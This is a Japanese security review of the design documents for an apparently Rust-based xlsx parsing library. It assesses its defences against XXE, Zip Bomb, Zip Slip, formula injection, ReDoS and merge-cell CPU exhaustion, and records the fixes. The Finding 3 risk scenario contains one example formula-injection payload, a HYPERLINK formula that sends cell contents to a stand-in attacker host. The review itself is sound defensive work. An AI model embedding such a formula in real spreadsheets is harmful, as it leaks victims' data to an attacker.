# `docs/design/` セキュリティレビュー

*[English](design-review.en.md)*

`docs/design/` 配下の全設計書（[architecture.md](../../design/architecture.md) およびそこからリンクされる `lib.rs` / `error.rs` / `pipeline.rs` / `container/` / `parse/` / `model/` / `resolve/` / `json.rs` 各ファイルの設計書、2026-08-17時点でIssue [#3](https://github.com/MinamiyamaKotaro/xlsxparser/issues/3) の対応関係表を満たす全ファイル）を対象に、要求仕様書2章が要求するセキュリティ要件（Zip Bomb・Zip Slip・XXE対策）を中心としたセキュリティレビューを実施した結果をまとめる。

`src/` はまだ空であり実装は存在しないため、本レビューは**設計書に記述された対策方針そのものの健全性**を評価するものであり、実装コードの脆弱性診断ではない。実装開始後は改めてコードベースに対するセキュリティレビューが必要になる。

## 総評

要求仕様書が明示する3つの脅威（Zip Bomb・Zip Slip・XXE）のうち、Zip BombとZip Slipについては複数の設計書にまたがる多層防御が具体的な型・アルゴリズムのレベルまで一貫して設計されており、健全と判断した。XXE対策については、当初「採用予定のXMLパーサーライブラリの既定動作に依存する」という暗黙の前提にとどまっていた点をFinding 1として指摘したが、本レビューを受けて `parse/mod.rs` に `read_event`（イベント読み取りの唯一の窓口。`Event::DocType` を無条件に拒否する）と、対応する `Error::DoctypeRejected` を追加する設計変更を同一PR内で行い解決済みである。

## Findings

### ~~Finding 1: XXE対策が明示的な設定ではなく、XMLパーサーの既定動作という暗黙の前提に依存している~~ → **解決**

* 深刻度: ~~Medium~~ → 解決済み
* 対象: [parse/mod.md](../../design/parse/mod.md) `create_secure_reader`、[parse/mod.md オープンクエスチョン1](../../design/parse/mod.md)
* 内容（指摘当時）: `create_secure_reader` の「主要な型・関数（案）」に示されたコードは `reader.config_mut().trim_text(false);` のみを設定しており、これは共有文字列の空白保持（`xml:space="preserve"`）のための設定であって、XXE対策とは無関係である。XXE対策そのものについては、同ファイルの解説文が「`quick-xml` は非検証型パーサーであり、標準構成のままでも外部実体・外部DTDサブセットのフェッチは行わないため、古典的なXXEはそもそも成立しない」と述べるにとどまり、これを明示的に強制するAPI呼び出しは示されていなかった。
* リスクシナリオ（指摘当時）: (1) 「`quick-xml`は既定でDTD処理・外部実体参照をサポートしない」という前提が採用バージョンで成立しなくなった場合（将来のマイナーバージョンアップで挙動が変わる、あるいは別のXMLパーサーへ乗り換える判断がなされた場合）、明示的な無効化設定がコード上に存在しないため、この設計のまま実装するとXXE攻撃（ローカルファイル読み取り、SSRF、サービス拒否）が成立しうる。(2) 実装者が本設計書の「暗黙の前提で足りる」という記述をそのまま実装し、要求仕様書2章「XMLパース時において、外部エンティティの展開を無効化する」という明文要件を、実際には何もコードで強制していないにもかかわらず「満たしている」と誤認する可能性がある。
* 対応内容: [parse/mod.md](../../design/parse/mod.md) に、イベント読み取りの唯一の窓口 `read_event` を新設した。`read_event` は `reader.read_event_into(buf)` の結果が `Event::DocType`（`<!DOCTYPE ...>` 宣言）であれば、宣言の内容（実体定義を含むか等）を一切解釈せず無条件に新設の `Error::DoctypeRejected`（[error.md](../../design/error.md)）を返す（fail closed）。`parse/` 配下の各モジュールは本関数経由でのみイベントを読み取り、`reader.read_event_into` を直接呼ばない。
  * **暗黙の前提からの独立**: OOXMLの `_rels`/`workbook.xml`/`sharedStrings.xml`/`styles.xml`/`sheetX.xml` はいずれも仕様上DOCTYPE宣言を持たないため、正当な `.xlsx` に対して誤検知が生じることはない。この対策は「quick-xmlが既定でDTD処理を行わない」という前提（[parse/mod.md オープンクエスチョン1](../../design/parse/mod.md)が依然として未確定としている、採用バージョン・`Reader`設定APIの詳細）とは独立して機能する。`Event` enumの構造（`DocType`バリアントの存在）はquick-xmlの主要バージョンを通じて安定しているため、当該オープンクエスチョンの解決状況にかかわらずXXE対策の実効性が保たれる。これが、当初の設計が抱えていた「暗黙の前提への依存」という課題そのものへの根本的な解決である。
  * **検証可能性**: [parse/mod.md テスト方針](../../design/parse/mod.md)に、DOCTYPE宣言と外部実体参照を含む攻撃ペイロードに対し `Error::DoctypeRejected` が返ることを確認する回帰テスト、および正当な入力に対して誤検知しないことを確認する回帰テストを追加した。

### ~~Finding 2: Zip Bombのデフォルトサイズ上限が未検証の暫定値であり、利用者側から調整する手段も未確定~~ → **解決**

* 深刻度: ~~Low~~ → 解決済み
* 対象: [container/sanitize.md](../../design/container/sanitize.md) `DEFAULT_MAX_UNCOMPRESSED_SIZE`（512 MiB）/ `DEFAULT_MAX_TOTAL_UNCOMPRESSED_SIZE`（2 GiB）、[container/sanitize.md オープンクエスチョン1](../../design/container/sanitize.md)
* 内容（指摘当時）: サイズ上限の実装方式（実際に読み出したバイト数をストリーミングでカウントし、ZIPヘッダーの自己申告サイズを信頼しない）自体は健全に設計されている。しかし上限の具体的な値は「暫定値」と明記されたままであり、また `lib.rs` の公開API（[lib.md](../../design/lib.md)）に上限を呼び出し側が調整できるオプションは存在しなかった。
* リスクシナリオ（指摘当時）: デフォルト値が実運用の入力ファイルサイズ分布に対して大きすぎる場合、単一プロセスでの同時処理数によってはメモリ枯渇（DoS）のリスクが相対的に高まる。逆に小さすぎる場合、正当な大規模ファイル（要求仕様書が主眼とする「方眼紙Excel」）を誤って拒否する可用性の問題が生じる。
* 対応内容: 要求仕様書自体には具体的なファイルサイズ上限の記載がないため、実務上の巨大シート（数十万〜100万セル規模）の展開後XMLサイズが概ね10〜50 MiB程度に収まるという実測に基づく分析を踏まえ、プロダクトオーナーが `DEFAULT_MAX_UNCOMPRESSED_SIZE`（512 MiB）/ `DEFAULT_MAX_TOTAL_UNCOMPRESSED_SIZE`（2 GiB）を最終値として確定した（正当な入力を誤って拒否しない十分な余裕を持ちつつDoSを抑制できる値と判断）。呼び出し側からの上書きは、[lib.md](../../design/lib.md) が新設した `SizeLimits` 構造体（[container/sanitize.md](../../design/container/sanitize.md)）と、既存の `parse_workbook`/`parse_workbook_reader` に上限を明示指定できるバリアント `parse_workbook_with_limits`/`parse_workbook_reader_with_limits` を通じて可能にした。`pipeline::run` が `SizeLimits` を受け取り、[container/mod.md](../../design/container/mod.md) が既に `pub(crate)` で実装していた `with_max_entry_size`/`with_max_total_size` へ橋渡しする（Issue [#14](https://github.com/MinamiyamaKotaro/xlsxparser/issues/14)）。

### ~~Finding 3: 数式由来・共有文字列由来のテキスト値がエスケープなしでそのまま公開APIへ渡され、下流でのCSV/数式インジェクションのリスクについて利用者向けの注意喚起がない~~ → **解決**

* 深刻度: ~~Low~~ → 解決済み（本ライブラリ自体の脆弱性ではなく、利用者側の誤用によって顕在化するリスクであるため、元々Low）
* 対象: [model/cell.md](../../design/model/cell.md) `CellValue::Text`、[json.md](../../design/json.md)、[lib.md](../../design/lib.md)
* 内容（指摘当時）: `.xlsx` のセル文字列（数式の計算結果文字列 `t="str"` を含む）は、設計上いかなる無害化処理も経ずに `CellValue::Text` としてそのまま `Workbook` に格納され、`to_json_string`/`to_json_writer` を通じてJSON文字列としてそのまま出力される。JSON自体への出力という文脈では（`serde_json` が適切にエスケープするため）安全だが、このJSONやWorkbookを受け取った下流システムが値をCSVやXLSXへ再エクスポートする場合、セル値が `=`, `+`, `-`, `@` 等で始まる文字列であれば、再エクスポート先のスプレッドシートアプリケーションで数式として実行されうる（いわゆるCSV Injection / Formula Injection）。これは本ライブラリの入力（信頼できない`.xlsx`）がそのまま出力(信頼できないテキスト)として透過する設計上、当然の帰結ではあるが、設計書・READMEのいずれにもこのリスクへの言及がなかった。
* リスクシナリオ（指摘当時）: 攻撃者が悪意あるセル値（例: `=HYPERLINK("http://evil.example/?"&A1,"click")`）を含む `.xlsx` を、本ライブラリを利用するアップロード機能へ提出する。アップロード先システムが解析結果をそのままCSVエクスポート機能や別の `.xlsx` 生成機能へ渡し、別の被害者（社内の別担当者等）がそのファイルを開くと、埋め込まれた数式が実行され、情報窃取やフィッシングにつながりうる。
* 対応内容: 本ライブラリ自体が値を書き換える設計変更は要求仕様書のスコープ外のため見送り、代わりに [README.md](../../../README.md)「Security notes」節と `src/lib.rs`（[lib.md](../../design/lib.md)）のクレートルートdocコメントの両方に、「本ライブラリが返す文字列値はセル内容をそのまま透過する。CSV/スプレッドシート形式として再エクスポートする呼び出し側は、数式インジェクション対策（先頭文字 `=`/`+`/`-`/`@` のエスケープ等）を各自の責務で実施すること」という趣旨の注意書きを追加した（Issue [#14](https://github.com/MinamiyamaKotaro/xlsxparser/issues/14)）。

### Finding 4: カスタム数値書式（`numFmtId >= 164`）の日付/時刻判定ヒューリスティックの実装方式が未確定であり、正規表現による実装を選んだ場合はReDoSの入力経路になりうる

* 深刻度: **Low**（現状は具体的な実装方式が未確定のプレースホルダーであり、確定した脆弱性ではない）
* 対象: [parse/styles.md](../../design/parse/styles.md) `is_date_time_format`、同ファイル オープンクエスチョン2
* 内容: `formatCode`（`styles.xml` 由来の信頼できない外部入力）を「ヒューリスティックに走査」して日付/時刻書式かを判定する設計だが、具体的な実装アルゴリズム（トークンの線形スキャンか、正規表現によるパターンマッチか）は未確定。もし実装時に破局的バックトラッキング（catastrophic backtracking）を起こしうる正規表現を採用した場合、`formatCode` は攻撃者が完全に制御できる文字列であるため、意図的に構成された `styles.xml` によって単一の書式判定処理がCPU時間を著しく消費させられる可能性がある。
* リスクシナリオ: 攻撃者が極端に長く反復的な `formatCode` 文字列（例: `\` エスケープを多用したパターン）を含む `styles.xml` を仕込んだ `.xlsx` を提出し、`is_date_time_format` の呼び出しが実質的にハングする。
* 推奨対応: 実装時に採用するアルゴリズムを線形時間で完結する単純なトークンスキャン（バックトラッキングを伴わない状態機械等）に限定し、正規表現を用いる場合は非バックトラッキングエンジン（例: `regex` クレート、Rust版の`regex`crateはRE2ベースで線形時間保証がある）を用いることを [parse/styles.md](../../design/parse/styles.md) の実装メモに明記する。

## 健全と判断した設計（Findingとしては計上しないが、根拠を明記する）

* **XXE対策**（[parse/mod.md](../../design/parse/mod.md) `read_event`）: Finding 1の指摘を受けて追加された、`Event::DocType` を無条件に拒否するfail closed設計。XMLパーサーの既定動作という暗黙の前提とは独立して機能する明示的・検証可能な対策になっている（詳細は上記Finding 1参照）。
* **Zip Bomb対策**（[container/sanitize.md](../../design/container/sanitize.md)）: ZIPヘッダーの自己申告サイズを信頼せず、`BoundedReader` が実際に読み出されたバイト数をストリーミングでカウントしてエントリ単体・累積の両方を強制する設計は、圧縮率を偽装する古典的なZip Bombに対して有効である。
* **Zip Slip対策の多層防御**（[container/sanitize.md](../../design/container/sanitize.md) `validate_entry_path` / [container/mod.md](../../design/container/mod.md) `get_entry` の毎回再検証 / [parse/relationships.md](../../design/parse/relationships.md) `resolve_target_path`）: アーカイブオープン時の一括検証、`get_entry` 呼び出しごとの再検証（rels由来の動的パスに対する多層防御として明示的に設計）、および実ディスクへの展開を一切行わない設計（sanitize.mdが明記する「本ライブラリはZIPエントリを実ディスクへ展開しないため、伝統的なZip Slip被害である『意図しないファイル書き込み』は直接には発生しない」）の三重の防御線が一貫して設計されている。`resolve_target_path` が生成しうる異常パス（過剰な `..`）を意図的に早期拒否せず最終防御を `get_entry` に委ねる設計判断も、責務分担として妥当である。
* **数値パースにおけるパニック回避**（[model/cell.md](../../design/model/cell.md) `CellRef::from_a1`）: 桁溢れを起こす行番号文字列に対して `panic` せず `Result` を返す方針が明記されており、信頼できない入力に対する堅牢性が確保されている。
* **fail-closed原則の一貫性**（[resolve/merge.md](../../design/resolve/merge.md) の結合範囲検証、[container/sanitize.md](../../design/container/sanitize.md) の `validate_entry_path`、[pipeline.md](../../design/pipeline.md) の各フェーズ早期リターン）: 不正・不整合な入力を検知した場合に部分的な結果を返さず処理全体を中断する方針が複数のモジュールにまたがって一貫して採用されている。
* **外部クレートエラーの型消去による依存の遮断**（[error.md](../../design/error.md)）: XMLパーサー・（将来的な）JSONシリアライザのエラー型をパブリックAPIに直接晒さない設計により、これらのクレートの内部実装詳細（バージョン固有のエラーメッセージ等）が利用者側のコードに漏出する経路を最小化している。
* **`Error::Io` のDisplay文言からのファイルパス除外**（[error.md](../../design/error.md)）: `path` フィールドを構造体には保持しつつ `Display`（`{error}` 相当の文言）には含めない設計により、呼び出し側が `err.to_string()` を安易にログ・レスポンスへ出力しても、サーバーのファイルシステムパスが不用意に露出しにくい。

## 対象外・スコープ外とした事項

* ~~結合範囲の検証アルゴリズムの計算量（O(N²)）や、行・セル数に応じたCPU時間の増大など、純粋なリソース枯渇（DoS）に関する懸念は、要求仕様書のZip Bomb対策（バイト数ベースの上限）で入力サイズ自体が有界であることを踏まえ、本レビューのスコープ外とした。~~ → **前提の誤りが判明、実装レベルで対応済み**: 実装完了後の [`docs/security/code-review.md` Finding 1](code-review.md) で、この「Zip Bombのバイト数上限が結合範囲の件数Nを実質的に有界にする」という前提そのものが誤りであることが実測で判明した（`<mergeCell>` 1件は約20〜30バイトしかなく、512MiBの上限内に1,700万件以上収まるため）。数百KB〜数MBのファイルで数十秒〜数分のCPU拘束を引き起こせることを確認し、`resolve::merge::MAX_MERGE_REGIONS`（既定20,000件）による防御的な件数上限を追加して対応した。詳細は [`docs/design/resolve/merge.md` オープンクエスチョン2の追記](../../design/resolve/merge.md)および [`docs/security/code-review.md` Finding 1](code-review.md) を参照。
* `container/` が採用するZIP操作クレートの選定（[container/mod.md オープンクエスチョン1](../../design/container/mod.md)）が確定していないため、当該クレート自体の既知脆弱性（サプライチェーンリスク）は本レビューでは評価していない。クレート選定時に別途評価が必要。
* 実装コード自体は存在しないため、メモリ安全性（Rustの言語機能により保証される）や、本レビューが指摘した設計方針からの実装時の逸脱は対象外とした。実装完了後に改めてコードレベルのセキュリティレビューを実施すること。
